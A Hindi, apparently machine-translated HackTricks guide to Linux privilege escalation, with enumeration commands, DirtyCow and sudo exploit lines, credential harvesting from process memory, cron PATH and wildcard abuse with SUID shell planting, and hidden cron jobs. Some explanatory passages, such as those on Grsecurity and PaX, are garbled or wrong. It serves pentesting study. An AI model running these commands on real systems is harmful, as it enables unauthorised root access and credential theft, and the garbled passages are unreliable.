# लिनक्स प्रिविलेज एस्कलेशन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा पीआर जमा करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

## सिस्टम सूचना

### ओएस सूचना

चलो शुरू करते हैं ओएस के बारे में कुछ ज्ञान प्राप्त करने के लिए।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### मार्ग

यदि आपके पास `PATH` चर में किसी फ़ोल्डर पर लेखन की अनुमति है, तो आप कुछ लाइब्रेरी या बाइनरी को हाइजैक कर सकते हैं:
```bash
echo $PATH
```
### वातावरण जानकारी

क्या वातावरण चरों में दिलचस्प जानकारी, पासवर्ड या API कुंजी हैं?
```bash
(env || set) 2>/dev/null
```
### कर्नल अभियांत्रिकी

कर्नल संस्करण की जांच करें और यदि कोई ऐसा अभियांत्रित है जिसका उपयोग विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है, तो उसे जांचें।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप एक अच्छी रूप से विकल्पशील कर्णेल सूची और कुछ पहले से ही **कंपाइल किए गए उत्पादों** को यहां पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)।
अन्य साइटें जहां आप कुछ **कंपाइल किए गए उत्पाद** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी विकल्पशील कर्णेल संस्करणों को निकालने के लिए आप निम्नलिखित कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
उपयोगी उपकरण जो कर्नल एक्सप्लॉइट्स की खोज में मदद कर सकते हैं हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (केवल पीडीएफ़ में निष्पादित करें, कर्नल 2.x के लिए एक्सप्लॉइट्स की जांच करता है)

हमेशा **Google में कर्नल संस्करण की खोज करें**, शायद आपके कर्नल संस्करण कोई कर्नल एक्सप्लॉइट में लिखा हो और फिर आप यह सुनिश्चित होंगे कि यह एक्सप्लॉइट मान्य है.

### CVE-2016-5195 (DirtyCow)

लिनक्स प्रिविलेज एस्कलेशन - लिनक्स कर्नल <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### सुडो संस्करण

जो विकल्पशील सुडो संस्करणों पर आधारित हैं वे निम्नलिखित हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि क्या sudo संस्करण संकटग्रस्त है।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### sudo < v1.28

यहां से @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg हस्ताक्षर सत्यापन विफल हुआ

इस खोज के एक **उदाहरण** के लिए **HTB के smasher2 बॉक्स** की जांच करें।
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक सिस्टम जांच

In addition to the basic system enumeration techniques mentioned earlier, there are several other methods that can be used to gather information about a target system. These techniques can help in identifying potential vulnerabilities and privilege escalation opportunities.

#### 1. Process Enumeration

Process enumeration involves identifying the running processes on a system. This can be done using commands like `ps` or `top`. By analyzing the processes, you can identify any unusual or suspicious activities that may indicate a security issue.

#### 2. Service Enumeration

Service enumeration involves identifying the services running on a system. This can be done using commands like `netstat` or `ss`. By analyzing the services, you can identify any open ports or listening services that may be vulnerable to exploitation.

#### 3. File and Directory Enumeration

File and directory enumeration involves identifying the files and directories present on a system. This can be done using commands like `ls` or `find`. By analyzing the file system, you can identify any sensitive files or directories that may contain valuable information.

#### 4. Network Enumeration

Network enumeration involves identifying the network configuration of a system. This can be done using commands like `ifconfig` or `ip`. By analyzing the network settings, you can identify any potential network-based vulnerabilities or misconfigurations.

#### 5. User Enumeration

User enumeration involves identifying the users present on a system. This can be done using commands like `cat /etc/passwd` or `getent passwd`. By analyzing the user accounts, you can identify any privileged or misconfigured accounts that may be exploited for privilege escalation.

#### 6. Kernel Enumeration

Kernel enumeration involves identifying the kernel version and configuration of a system. This can be done using commands like `uname -a` or `cat /proc/version`. By analyzing the kernel, you can identify any known vulnerabilities or weaknesses that may be exploited.

#### 7. Software Enumeration

Software enumeration involves identifying the installed software and their versions on a system. This can be done using commands like `dpkg -l` or `rpm -qa`. By analyzing the software, you can identify any outdated or vulnerable applications that may be exploited.

By performing these additional system enumeration techniques, you can gather more information about a target system and increase your chances of finding potential vulnerabilities and privilege escalation opportunities.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### विभाजन की संभावित सुरक्षा की जांच करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity एक लिनक्स कर्णल पैच है जो लिनक्स सिस्टमों को सुरक्षित बनाने के लिए उपयोग होता है। यह पैच कई सुरक्षा उन्नतियों को जोड़ता है जो लिनक्स कर्णल में नहीं होती हैं। Grsecurity के कुछ मुख्य फीचर्स शामिल हैं:

- एक्सिस नियंत्रण: यह अनधिकृत एक्सेस को रोकने के लिए उपयोग होता है और अनधिकृत प्रोसेसेस को विशेष अनुमतियाँ देने के लिए उपयोग होता है।
- रैंडमाइज़ वर्चुअल बेस एड्रेस (KASLR): यह कर्णल मेमोरी के लिए एक रैंडम वर्चुअल बेस एड्रेस निर्धारित करता है, जिससे एक्सप्लोइट्स को कर्णल के स्थान का पता लगाना मुश्किल होता है।
- ग्रेड ऑडिटिंग: यह कर्णल के लिए एक ऑडिटिंग फ्रेमवर्क प्रदान करता है जो अनधिकृत गतिविधियों को ट्रैक करता है और लॉग करता है।
- एनएसए: यह एनएसए (नेटवर्क सिक्योरिटी एडिशन) फ़ाइल सिस्टम को सुरक्षित करने के लिए उपयोग होता है। यह फ़ाइल सिस्टम के लिए अनुमतियों को नियंत्रित करता है और अनधिकृत पहुंच को रोकता है।

Grsecurity एक शक्तिशाली सुरक्षा उपाय है जो लिनक्स सिस्टमों को हार्डन करने के लिए उपयोग किया जा सकता है। इसे इंस्टॉल करने के लिए, आपको अपने कर्णल को पैच करने और फिर उसे कंपाइल करने की आवश्यकता होती है। Grsecurity के उपयोग के लिए आपको एक वैध लाइसेंस की आवश्यकता होती है, जो आपको उनकी वेबसाइट से प्राप्त कर सकते हैं।
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### पैक्स

PaX एक लिनक्स कर्नल पैच है जो बढ़ती हुई सुरक्षा प्रदान करने के लिए उपयोग होता है। यह विभिन्न तकनीकों का उपयोग करके अनुमतियों को सीमित करता है और अनधिकृत पहुंच को रोकता है। PaX के द्वारा लिनक्स कर्नल में निम्नलिखित सुरक्षा उपाय शामिल होते हैं:

- एक्सीक्यूटेबल बिनारी कोड के लिए एक्सीक्यूटेबल बिट (एक्सबिट) का उपयोग करना।
- डेटा सेगमेंट को अस्थायी रूप से अप्रवेश्य बनाना।
- रनटाइम लोडिंग के दौरान एक्सीक्यूटेबल बिनारी कोड को अस्थायी रूप से अप्रवेश्य बनाना।
- एक्सीक्यूटेबल बिनारी कोड को अस्थायी रूप से अप्रवेश्य बनाने के लिए एक्सबिट बिट का उपयोग करना।

PaX का उपयोग करके, एक हैकर को अनधिकृत पहुंच प्राप्त करने के लिए इन तकनीकों का उपयोग करना कठिन हो जाता है। यह लिनक्स सिस्टम को अधिक सुरक्षित बनाने में मदद करता है और अनधिकृत पहुंच से बचाता है।
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### एक्ज़ेक्यूशील्ड

Execshield एक लिनक्स कर्नल सुरक्षा फ़ीचर है जो एक्सीक्यूटेबल फ़ाइलों को सुरक्षित रखने के लिए उपयोग होता है। यह एक्सीक्यूटेबल फ़ाइलों के लिए बफ़र ओवरफ़्लो को रोकने और एक्सीक्यूटेबल फ़ाइलों को अनधिकृत एक्सीक्यूशन से बचाने के लिए डिज़ाइन किया गया है। यह एक्ज़ेक्यूशन कंट्रोल नो-एक्ज़ेक्यूशन (NX) बिट का उपयोग करता है जो एक्सीक्यूटेबल फ़ाइलों को अनधिकृत कोड के खिलाफ सुरक्षित रखता है। एक्ज़ेक्यूशील्ड एक प्रभावी तकनीक है जो लिनक्स सिस्टमों की सुरक्षा को मजबूत करने में मदद करती है।
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) एक Linux kernel security module है जो अत्यधिक सुरक्षा प्रदान करने के लिए डिज़ाइन किया गया है। यह अनधिकृत उपयोग, अनधिकृत पहुंच और अनधिकृत गतिविधियों को रोकने के लिए अनुमति देता है। SElinux अनुमतियों को नियंत्रित करने के लिए अनुमति नीतियों का उपयोग करता है और इसे उपयोगकर्ताओं, प्रक्रियाओं और फ़ाइलों के लिए अलग-अलग सुरक्षा स्तर प्रदान करने के लिए विभाजित किया जा सकता है।

यदि आपके सिस्टम में SElinux सक्षम है, तो आपको इसके नियंत्रण और निर्देशिका नीतियों को समझना चाहिए। यह आपके सिस्टम को अधिक सुरक्षित बनाने में मदद कर सकता है और अनधिकृत पहुंच से बचाने में मदद कर सकता है।

यदि आपको SElinux को अक्षम करने की आवश्यकता होती है, तो आप इसे अक्षम कर सकते हैं या फिर नियंत्रण नीतियों को अनुकूलित कर सकते हैं। इसे अक्षम करने से पहले, आपको इसके प्रभाव को समझना चाहिए और इसके अक्षम होने से पहले अनुमतियों को ध्यान से जांचना चाहिए।
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
ASLR (Address Space Layout Randomization) एक लिनक्स हार्डनिंग तकनीक है जो किसी प्रोसेस के मेमोरी रीजर्वेशन को यादृच्छिक रूप से बदलती है। इसका उद्देश्य है कि एक हाकर को निश्चित मेमोरी पते पर पहुंचने के लिए अधिक कठिनाई हो। ASLR के द्वारा, प्रोसेस के विभिन्न भागों के मेमोरी पते यादृच्छिक रूप से चुने जाते हैं, जिससे हाकर को उन भागों के पते का पता लगाना मुश्किल हो जाता है।

ASLR को एक्टिवेट करने के लिए, आपको `/proc/sys/kernel/randomize_va_space` फ़ाइल को 2 के साथ सेट करना होगा। आप इसे निम्नलिखित आदेश का उपयोग करके कर सकते हैं:

```bash
echo 2 > /proc/sys/kernel/randomize_va_space
```

ASLR को अक्टिवेट करने के बाद, प्रत्येक प्रोसेस के लिए यादृच्छिक मेमोरी पते निर्धारित होंगे, जो हाकर को उन पतों का पता लगाने को कठिन बना देगा।
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## डॉकर ब्रेकआउट

यदि आप डॉकर कंटेनर के अंदर हैं, तो आप इससे बाहर निकलने का प्रयास कर सकते हैं:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## ड्राइव्स

**जांचें कि क्या माउंट किया गया है और क्या अनमाउंट किया गया है**, कहां और क्यों। यदि कोई चीज अनमाउंट की गई है, तो आप इसे माउंट करने का प्रयास कर सकते हैं और निजी जानकारी की जांच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी बाइनरीज़ की जांच करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, **किसी भी कंपाइलर की स्थापना की जांच करें**। यह उपयोगी हो सकता है यदि आपको कुछ कर्णेल उत्पीड़न का उपयोग करना हो, क्योंकि इसे आपके द्वारा उपयोग किए जाने वाले मशीन में (या एक समान) कंपाइल करना सिफारिश किया जाता है।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### संस्थापित संग्रहणीय सॉफ़्टवेयर

**संस्थापित पैकेज और सेवाओं के संस्करण** की जांच करें। शायद कुछ पुराने Nagios संस्करण (उदाहरण के लिए) हो सकते हैं जिनका उपयोग विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है...\
सलाह दी जाती है कि आप मैन्युअल रूप से संदिग्ध संस्थापित सॉफ़्टवेयर के संस्करण की जांच करें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन में SSH पहुंच है, तो आप **openVAS** का उपयोग करके मशीन के अंदर स्थापित अप-to-date और वंशविक्रमी सॉफ़्टवेयर की जांच कर सकते हैं।

{% hint style="info" %}
_ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएंगे जो अधिकांशतः अवांछनीय होगी, इसलिए यह सिफारिश की जाती है कि ऐसे अनुप्रयोगों का उपयोग करें जो जांचेंगे कि क्या कोई स्थापित सॉफ़्टवेयर संस्करण ज्ञात खतरों के लिए वंशविक्रमी है_
{% endhint %}

## प्रक्रियाएँ

**कौन सी प्रक्रियाएँ** चल रही हैं उन्हें देखें और यह जांचें कि क्या कोई प्रक्रिया **इससे अधिक अधिकार** रखती है (शायद एक रूट द्वारा चलाई जा रही टॉमकैट?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा [**electron/cef/chromium debuggers** चल रहे हो सकते हैं, आप इसका दुरुपयोग करके विशेषाधिकारों को बढ़ा सकते हैं](electron-cef-chromium-debugger-abuse.md)। **Linpeas** इसे प्रक्रिया के कमांड लाइन में `--inspect` पैरामीटर की जांच करके खोजता है।
इसके अलावा, **प्रक्रिया बाइनरी पर अपनी विशेषाधिकारों की जांच करें**, शायद आप किसी को ओवरराइट कर सकते हैं।

### प्रक्रिया मॉनिटरिंग

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे उपकरणों का उपयोग करके प्रक्रियाओं की मॉनिटरिंग कर सकते हैं। यह बहुत उपयोगी हो सकता है विकल्पित रूप से निष्पादित होने वाली जोखिमपूर्ण प्रक्रियाओं की पहचान करने के लिए या जब एक सेट की गई आवश्यकताएं पूरी होती हैं।

### प्रक्रिया मेमोरी

सर्वर की कुछ सेवाएं **मेमोरी के अंदर साफ पाठ में प्रमाणपत्र सहेजती हैं**।
सामान्यतः आपको **रूट विशेषाधिकार** की आवश्यकता होगी ताकि आप अन्य उपयोगकर्ताओं की प्रक्रियाओं की मेमोरी पढ़ सकें, इसलिए यह आमतौर पर जब आप पहले से ही रूट हैं और अधिक प्रमाणपत्रों की खोज करना चाहते हैं तो अधिक उपयोगी होता है।
हालांकि, ध्यान दें कि **आमतौर पर उपयोगकर्ता के रूप में आप अपनी प्रक्रियाओं की मेमोरी पढ़ सकते हैं**।

{% hint style="warning" %}
ध्यान दें कि आजकल अधिकांश मशीनों **डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं होती** है, जिसका मतलब है कि आप अपने अनधिकृत उपयोगकर्ता के उपयोगकर्ता के अन्य प्रक्रियाओं को डंप नहीं कर सकते हैं।

फ़ाइल _**/proc/sys/kernel/yama/ptrace\_scope**_ ptrace की पहुँच को नियंत्रित करती है:

* **kernel.yama.ptrace\_scope = 0**: सभी प्रक्रियाएं डीबग की जा सकती हैं, जब तक उनके पास एक ही uid हो। यह ptracing का क्लासिकल तरीका है।
* **kernel.yama.ptrace\_scope = 1**: केवल एक माता प्रक्रिया को डीबग किया जा सकता है।
* **kernel.yama.ptrace\_scope = 2**: केवल व्यवस्थापक ptrace का उपयोग कर सकता है, क्योंकि इसे CAP\_SYS\_PTRACE क्षमता की आवश्यकता होती है।
* **kernel.yama.ptrace\_scope = 3**: कोई प्रक्रिया ptrace के साथ ट्रेस नहीं की जा सकती है। एक बार सेट करने के बाद, ptracing को फिर से सक्षम करने के लिए एक पुनरारंभ की आवश्यकता होती है।
{% endhint %}

#### GDB

यदि आपके पास FTP सेवा की मेमोरी का उपयोग होता है (उदाहरण के लिए) तो आप हीप को प्राप्त कर सकते हैं और उसके प्रमाणपत्रों के भीतर खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps और /proc/$pid/mem

एक दिए गए प्रक्रिया आईडी के लिए, **maps प्रक्रिया के भीतर कैसे मेमोरी मैप होती है दिखाता है**; यह भी **प्रत्येक मैप क्षेत्र की अनुमतियों को दिखाता है**। **mem** प्सेडो फ़ाइल **प्रक्रिया की मेमोरी को उजागर करती है**। हम **maps** फ़ाइल से जानते हैं कि कौन से **मेमोरी क्षेत्र पठनीय हैं** और उनके ऑफ़सेट्स। हम इस जानकारी का उपयोग करके **mem फ़ाइल में जाकर सभी पठनीय क्षेत्रों को डंप करते हैं** एक फ़ाइल में।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` तंत्र की **भौतिक** स्मृति तक पहुंच प्रदान करता है, न कि वर्चुअल स्मृति। कर्नल के वर्चुअल पता स्थान को /dev/kmem का उपयोग करके पहुंचा जा सकता है।\
आमतौर पर, `/dev/mem` केवल **रूट** और **kmem** समूह द्वारा पढ़ने योग्य होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump लिनक्स के लिए

ProcDump एक लिनक्स का नया रूप है, जो विंडोज के Sysinternals सुइट के श्रेणी से आने वाले क्लासिक ProcDump टूल का है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

प्रक्रिया की मेमोरी डंप करने के लिए आप निम्न उपकरण का उपयोग कर सकते हैं:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (रूट) - \_आप रूट आवश्यकता को मैन्युअल रूप से हटा सकते हैं और आपके द्वारा स्वामित्व में रखी प्रक्रिया को डंप कर सकते हैं
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) के स्क्रिप्ट A.5 (रूट की आवश्यकता होती है)

### प्रक्रिया मेमोरी से प्रमाणीकरण जानकारी

#### मैन्युअल उदाहरण

यदि आपको प्रमाणीकरण प्रक्रिया चल रही है तो:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप प्रक्रिया को डंप कर सकते हैं (प्रक्रिया की मेमोरी को डंप करने के लिए विभिन्न तरीकों को ढूंढने के लिए पहले खंड देखें) और मेमोरी में क्रेडेंशियल्स की खोज कर सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### मिमीपेंगुइन

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **साफ पाठ प्रमाणीकरण** और कुछ **प्रसिद्ध फ़ाइलों** से पाठ चोरी करेगा। इसे सही ढंग से काम करने के लिए रूट विशेषाधिकारों की आवश्यकता होती है।

| सुविधा                                           | प्रक्रिया का नाम         |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali डेस्कटॉप, Debian डेस्कटॉप)       | gdm-password         |
| Gnome Keyring (Ubuntu डेस्कटॉप, ArchLinux डेस्कटॉप) | gnome-keyring-daemon |
| LightDM (Ubuntu डेस्कटॉप)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                   | vsftpd               |
| Apache2 (सक्रिय HTTP बेसिक ऑथ सत्र)         | apache2              |
| OpenSSH (सक्रिय SSH सत्र - सुडो उपयोग)        | sshd:                |

#### खोज रेजेक्स/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## निर्धारित / क्रॉन जॉब्स

जांचें कि क्या कोई निर्धारित जॉब भेद्य है। शायद आप रूट द्वारा निष्पादित किसी स्क्रिप्ट का लाभ उठा सकते हैं (वाइल्डकार्ड भेद्यता? क्या रूट द्वारा उपयोग किए जाने वाले फ़ाइलों को संशोधित किया जा सकता है? सिमलिंक का उपयोग करें? रूट द्वारा उपयोग की जाने वाली निर्देशिका में विशेष फ़ाइलें बनाएँ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### क्रॉन पथ

उदाहरण के लिए, _/etc/crontab_ फ़ाइल के अंदर आप पाठ पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि "user" उपयोगकर्ता को /home/user पर लेखन अधिकार है_)

यदि इस crontab में रूट उपयोगकर्ता कोई कमांड या स्क्रिप्ट पाथ सेट किए बिना चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप निम्नलिखित उपयोग करके रूट शेल प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### क्रॉन एक स्क्रिप्ट का उपयोग करके वाइल्डकार्ड का उपयोग करना (वाइल्डकार्ड इंजेक्शन)

यदि रूट द्वारा एक स्क्रिप्ट को निष्पादित किया जाता है और उसमें एक "वाइल्डकार्ड" है, तो आप इसका उपयोग करके अप्रत्याशित चीजें कर सकते हैं (जैसे कि प्राइवेसीक). उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि वाइल्डकार्ड के पथ के पहले** _**/some/path/\***_ **जैसा हो, तो यह संकटग्रस्त नहीं होता (हालांकि** _**./\***_ **भी नहीं होता है।)**

वाइल्डकार्ड उत्पीड़न त्रुटियों के लिए अधिक ट्रिक्स के लिए निम्नलिखित पृष्ठ को पढ़ें:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### क्रॉन स्क्रिप्ट अधिलेखन और सिंबलिंक

यदि आप **रूट द्वारा निष्पादित किए जाने वाले क्रॉन स्क्रिप्ट को संशोधित कर सकते हैं**, तो आप बहुत आसानी से एक शेल प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि रूट द्वारा निष्पादित स्क्रिप्ट एक **ऐसे निर्देशिका का उपयोग करता है जिसमें आपके पास पूरी पहुंच होती है**, तो शायद यह उपयोगी हो सकता है कि आप उस फ़ोल्डर को हटा दें और एक और फ़ोल्डर के लिए **सिंबलिंक फ़ोल्डर बनाएं** जिसमें आपके द्वारा नियंत्रित स्क्रिप्ट का सेवन हो।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### आवृत्ति वाले क्रॉन जॉब्स

आप प्रक्रियाओं की निगरानी कर सकते हैं ताकि आप 1, 2 या 5 मिनट के अंतराल में चल रही प्रक्रियाओं को खोज सकें। शायद आप इसका फायदा उठा सकते हैं और विशेषाधिकारों को बढ़ा सकते हैं।

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1 सेकंड की निगरानी करने**, **कम चलाए गए कमांडों के आधार पर क्रमबद्ध करें** और सबसे अधिक चलाए गए कमांडों को हटा दें, आप निम्नलिखित कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप भी** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **का उपयोग कर सकते हैं** (यह हर प्रक्रिया का मॉनिटरिंग करेगा और सूचीबद्ध करेगा जो प्रारंभ होती है)।

### अदृश्य cron नौकरियां

यह संभव है कि एक cron नौकरी बनाने के लिए **टिप्पणी के बाद एक कैरिज रिटर्न डालें** (न्यूलाइन वर्ण के बिना), और cron नौकरी काम करेगी। उदाहरण (कृपया कैरिज रिटर्न वर्ण का ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएं

### लिखने योग्य _.service_ फ़ाइलें

